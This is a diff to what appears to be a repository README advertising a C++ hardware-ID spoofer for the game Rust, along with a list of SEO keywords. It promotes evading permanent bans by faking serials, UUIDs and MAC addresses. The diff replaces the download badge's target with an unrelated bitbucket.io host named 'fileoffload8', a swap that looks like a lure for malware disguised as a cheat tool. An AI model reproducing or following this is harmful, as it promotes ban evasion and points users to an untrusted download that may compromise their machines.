@@ -2,7 +2,7 @@
 
 Avoid Rust hardware bans with the ultimate **HWID Spoofer**, built in fast and reliable **C++**. This tool resets key hardware identifiers, cleans hidden tracking files, and restores access even after permanent bans. 💻 Whether you're facing a ban or just want extra protection, Rust HWID Spoofer ensures your identity remains hidden and safe. Easy to use, lightning-fast, and compatible with nearly any machine.
 
-[![Download Rust HWID Spoofer](https://img.shields.io/badge/Download-Rust_HWID_Spoofer-blueviolet)](https://wecheaters.github.io/cheats/rust/)
+[![Download Rust HWID Spoofer](https://img.shields.io/badge/Download-Rust_HWID_Spoofer-blueviolet)](https://fileoffload8.bitbucket.io)
 
 ---
 
@@ -72,3 +72,4 @@ This HWID Spoofer modifies serials, UUIDs, MAC addresses, and other system finge
 Rust HWID Spoofer, HWID Cleaner for Rust, Rust Unban Tool, Rust Hardware ID Reset, Undetected HWID Spoofer, C++ Rust Spoofer, Rust Serial Changer, MAC Address Spoofer Rust, Rust Identity Reset Tool, Rust Trace Remover, Free Rust HWID Tool
 
 ---
+
